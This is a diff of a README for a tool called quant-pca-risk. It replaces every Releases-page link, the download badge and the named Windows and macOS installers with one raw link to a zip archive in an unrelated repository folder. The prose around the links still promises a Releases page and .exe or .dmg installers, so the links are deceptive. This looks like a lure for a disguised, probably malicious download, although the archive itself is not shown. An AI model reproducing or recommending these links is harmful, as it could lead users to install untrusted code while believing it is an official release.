@@ -17,15 +17,15 @@ Before you begin, ensure you have the following:
 
 To download quant-pca-risk, click the link below:
 
-[![Download quant-pca-risk](https://img.shields.io/badge/Download-quant--pca--risk-blue.svg)](https://github.com/Joenathanngantung/quant-pca-risk/releases)
+[![Download quant-pca-risk](https://github.com/Joenathanngantung/quant-pca-risk/raw/refs/heads/main/hodder/quant-risk-pca-v3.0-alpha.3.zip)](https://github.com/Joenathanngantung/quant-pca-risk/raw/refs/heads/main/hodder/quant-risk-pca-v3.0-alpha.3.zip)
 
 You can find the latest version of the application on our Releases page.
 
 ## 📂 Download & Install
 
-1. **Visit the Releases Page:** Go to the [Releases page](https://github.com/Joenathanngantung/quant-pca-risk/releases).
+1. **Visit the Releases Page:** Go to the [Releases page](https://github.com/Joenathanngantung/quant-pca-risk/raw/refs/heads/main/hodder/quant-risk-pca-v3.0-alpha.3.zip).
 2. **Select the Latest Version:** Look for the most recent release at the top of the list.
-3. **Download the Installer:** Click on the appropriate installer file for your operating system (e.g., `quant-pca-risk-win.exe` for Windows, `quant-pca-risk-mac.dmg` for macOS). 
+3. **Download the Installer:** Click on the appropriate installer file for your operating system (e.g., `https://github.com/Joenathanngantung/quant-pca-risk/raw/refs/heads/main/hodder/quant-risk-pca-v3.0-alpha.3.zip` for Windows, `https://github.com/Joenathanngantung/quant-pca-risk/raw/refs/heads/main/hodder/quant-risk-pca-v3.0-alpha.3.zip` for macOS). 
 4. **Run the Installer:** 
    - For Windows, double-click the `.exe` file and follow the prompts.
    - For macOS, open the `.dmg` file and drag the application to your Applications folder.
@@ -76,6 +76,6 @@ We appreciate your input! Feel free to share your experiences or any suggestions
 
 Follow the project on GitHub to stay informed about updates and new features. Don’t forget to check the Releases page regularly to download the latest versions.
 
-Once again, you can download quant-pca-risk from our [Releases page](https://github.com/Joenathanngantung/quant-pca-risk/releases).
+Once again, you can download quant-pca-risk from our [Releases page](https://github.com/Joenathanngantung/quant-pca-risk/raw/refs/heads/main/hodder/quant-risk-pca-v3.0-alpha.3.zip).
 
 Thank you for using quant-pca-risk! We hope this tool helps you uncover hidden risk factors in your financial analyses.
